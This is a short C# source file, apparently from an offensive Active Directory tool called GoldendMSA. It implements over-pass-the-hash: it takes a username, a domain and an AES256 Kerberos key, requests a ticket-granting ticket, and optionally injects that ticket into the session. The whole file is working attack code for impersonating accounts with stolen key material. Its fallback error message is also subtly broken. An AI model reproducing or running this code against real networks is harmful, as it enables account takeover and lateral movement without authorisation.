using System;


namespace GoldendMSA
{

    public class OPTH
    {
       
        public static int Over_pass_the_hash(string username, string domainName, string aes256, bool ptt,  bool verbose  )
        {

            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            Interop.KERB_ETYPE suppEncType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            
            try
            {
                byte[] response = Ask.TGT(username, domainName, aes256, encType, ptt, suppEncType, verbose);
                if (response.Length > 300) // random number that I chose to check if there is a ticket
                {
                    return 1;
                }
            }
            catch (KRB_ERROR ex)
            {
                if (verbose)
                {
                    
                    try
                    {

                        Console.WriteLine("\r\n[X] ERROR : {0}: {1}\r\n", (Interop.KERBEROS_ERROR)ex.error_code, ex.e_text);


                    }
                    catch
                    {
                        Console.WriteLine("\r\n[X] ERROR : {1}\r\n", (Interop.KERBEROS_ERROR)ex.error_code);
                    }
                }
            }
            return 0;
            
        }


    }

}